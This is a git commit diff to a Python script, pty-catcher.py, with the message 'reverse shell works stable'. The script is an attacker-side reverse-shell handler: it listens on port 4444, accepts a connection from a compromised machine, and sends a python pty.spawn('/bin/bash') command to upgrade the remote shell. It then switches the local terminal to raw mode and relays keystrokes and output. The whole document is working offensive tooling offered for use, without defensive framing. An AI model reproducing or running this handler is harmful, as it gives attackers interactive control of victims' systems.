de7430bfcc1fd214d54ec02b5e187f92cc3c5ec6
cybermaksx <cybermaksx@proton.me>
2026-07-01 15:42:23 +0300

    reverse shell works stable

--- pty-catcher.py
+++ pty-catcher.py
@@ -5,6 +5,7 @@ import termios
 import tty
 import signal
 import argparse
+import time
 
 
 def build_listener(host, port):
@@ -20,16 +21,24 @@ s = build_listener("0.0.0.0", 4444)
 
 print("[*] listening on 4444")
 conn, addr = s.accept()
-while True:
-    r, _, _ = select.select([0, conn], [], [])
-    for fd in r:
-        if fd == 0:
-            data = os.read(0, 4096)
-            conn.sendall(data) 
-        else:
-            data = conn.recv(4096)
-            if not data:
-                break
-            os.write(1, data)   
 
+conn.sendall(b'''python3 -c 'import pty;pty.spawn("/bin/bash")'\n''')
+time.sleep(1.0)
+
+old = termios.tcgetattr(0)
+tty.setraw(0)
+try:
+    while True:
+        r, _, _ = select.select([0, conn], [], [])
+        for fd in r:
+            if fd == 0:
+                data = os.read(0, 4096)
+                conn.sendall(data)
+            else:
+                data = conn.recv(4096)
+                if not data:
+                    break
+                os.write(1, data)
+finally:
+    termios.tcsetattr(0, termios.TCSADRAIN, old)
 
